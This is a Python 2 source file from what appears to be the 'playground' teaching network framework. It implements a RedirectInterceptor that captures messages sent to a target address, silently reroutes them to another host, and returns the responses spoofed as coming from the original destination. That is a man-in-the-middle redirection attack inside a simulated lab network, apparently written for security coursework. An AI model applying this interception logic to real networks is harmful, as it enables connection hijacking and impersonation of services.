'''
Created on Mar 28, 2016

@author: sethjn
'''
from playground.network.common.MessageHandler import SimpleMessageHandlingProtocol
from playground.network.common.Protocol import Protocol
from playground.network.client.ClientApplicationServer import ClientApplicationClient
from playground.network.message import MessageData
from playground.network.message.definitions.playground.base import ClientToClientMessage
from playground.network.client.ClientBase import ClientBase
from playground.network.common.PlaygroundAddress import PlaygroundAddress
from playground.network.client.ClientInterceptor import InterceptorFactory

class RerouteProtocol(Protocol):
    def __init__(self, factory, addr):
        Protocol.__init__(self, factory, addr)
        self.respHandler = None
        
    def dataReceived(self, buf):
        if self.respHandler: self.respHandler(buf)
        
class RerouteFactory(ClientApplicationClient):
    Protocol = RerouteProtocol
        

class RedirectInterceptor(SimpleMessageHandlingProtocol):
    def __init__(self, factory, addr, rerouteAddr, clientBase):
        SimpleMessageHandlingProtocol.__init__(self, factory, addr)
        self.clientBase = clientBase
        self.rerouteAddr = PlaygroundAddress.FromString(rerouteAddr)
        self.connections = {}
        self.registerMessageHandler(ClientToClientMessage, self.handleC2CMessage)
        
    def handleC2CMessage(self, protocol, msg):
        msgObj = msg.data()
        if msgObj.srcAddress == self._addr:
            # this is from the src. Just drop it
            pass
        elif msgObj.dstAddress == self._addr:
            # this is to the dst. Redirect.
            connKey = (msgObj.srcAddress, msgObj.srcPort, msgObj.dstPort)
            if not self.connections.has_key(connKey):
                connSrcPort, self.connections[connKey] = self.clientBase.connect(RerouteFactory(),
                                                                    self.rerouteAddr,
                                                                    msgObj.dstPort)
                self.connections[connKey].respHandler = lambda buf: self.rerouteResponse(srcAddress=msgObj.dstAddress, 
                                                                                         srcPort=msgObj.dstPort, 
                                                                                         dstAddress=msgObj.srcAddress, 
                                                                                         dstPort=msgObj.srcPort, 
                                                                                         buf=buf)
            self.connections[connKey].transport.write(msgObj.clientPacket)
            
    def rerouteResponse(self, srcAddress, srcPort, dstAddress, dstPort, buf):
        mb = MessageData.GetMessageBuilder(ClientToClientMessage)
        mb["srcAddress"].setData(srcAddress)
        mb["srcPort"].setData(srcPort)
        mb["dstAddress"].setData(dstAddress)
        mb["dstPort"].setData(dstPort)
        mb["clientPacket"].setData(buf)
        self.transport.writeMessage(mb)
        
def main(chaperoneAddr, playgroundAddr, interceptAddr, rerouteAddr):
    clientBase = ClientBase(PlaygroundAddress.FromString(playgroundAddr))
    interceptProtocol = RedirectInterceptor(None, interceptAddr, rerouteAddr, clientBase)
    intercept = InterceptorFactory(interceptAddr, interceptProtocol, interceptProtocol)
    clientBase.runWhenConnected(lambda: intercept.connectToChaperone(chaperoneAddr, 9090))
    clientBase.connectToChaperone(chaperoneAddr, 9090)
    
if __name__=="__main__":
    import sys
    print sys.argv
    main(*(sys.argv[1:]))